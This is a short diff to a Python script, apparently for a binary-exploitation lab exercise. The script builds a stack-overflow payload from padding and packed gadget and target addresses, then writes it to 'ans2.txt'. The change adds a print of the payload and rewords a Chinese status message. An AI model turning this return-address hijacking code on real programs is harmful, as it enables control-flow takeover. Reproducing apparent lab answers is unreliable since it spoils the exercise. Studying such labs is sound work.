@@ -11,8 +11,8 @@ payload = padding
 payload+=struct.pack("<Q", gadget_addr)
 payload+=struct.pack("<Q", right_addr)
 payload+=struct.pack("<Q", target_addr)
-
+print(payload)
 with open("ans2.txt", "wb") as f:
     f.write(payload)
 
-print(f"[*] Payload 生成完毕，跳转目标: {hex(target_addr)}")
+print(f"Payload已生成，跳转目标: {hex(target_addr)}")
